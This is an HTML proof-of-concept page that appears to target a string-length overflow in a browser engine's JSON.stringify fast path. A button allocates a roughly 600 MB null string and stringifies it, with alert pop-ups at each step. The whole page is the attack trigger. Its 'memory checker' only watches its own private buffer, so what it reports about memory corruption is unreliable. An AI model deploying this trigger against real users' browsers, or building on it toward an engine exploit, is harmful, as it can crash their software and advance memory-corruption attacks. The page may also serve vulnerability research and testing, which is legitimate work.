<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FastStringifier Overflow PoC with Alert</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>FastStringifier Overflow PoC</h1>
    <p>Click to test string length overflow in JSON.stringify with alerts.</p>
    <button id="trigger">Trigger Overflow</button>
    <script>
        function checkMemory() {
            const buffer = new ArrayBuffer(4096);
            const view = new Uint8Array(buffer);
            for (let i = 0; i < view.length; i++) {
                view[i] = 0xFF;
            }
            return () => {
                let changes = [];
                for (let i = 0; i < view.length; i++) {
                    if (view[i] !== 0xFF) {
                        changes.push(`0x${i.toString(16)}: 0x${view[i].toString(16)}`);
                    }
                }
                return changes.length > 0 ? changes.join(', ') : 'No changes';
            };
        }

        document.getElementById('trigger').addEventListener('click', async () => {
            alert('Initiating PoC...');
            try {
                // Initialize memory checker
                const check = checkMemory();
                alert('Memory checker initialized. Starting overflow attempt.');

                // Allocate large string
                const stringSize = 600000000; // ~600MB
                alert(`Attempting to allocate string of size ${stringSize} bytes...`);
                setTimeout(() => {
                    try {
                        const string = "\x00".repeat(stringSize);
                        alert('String allocated successfully. Attempting JSON.stringify...');

                        // Check memory before stringify
                        const before = check();
                        alert(`Memory before stringify: ${before}`);

                        // Trigger overflow
                        JSON.stringify(string);

                        // Check memory after (unlikely to reach here if crash occurs)
                        const after = check();
                        alert(`Memory after stringify: ${after}`);
                    } catch (err) {
                        alert(`Error: ${err.message}`);
                    }
                }, 100);
            } catch (err) {
                alert(`Initial error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
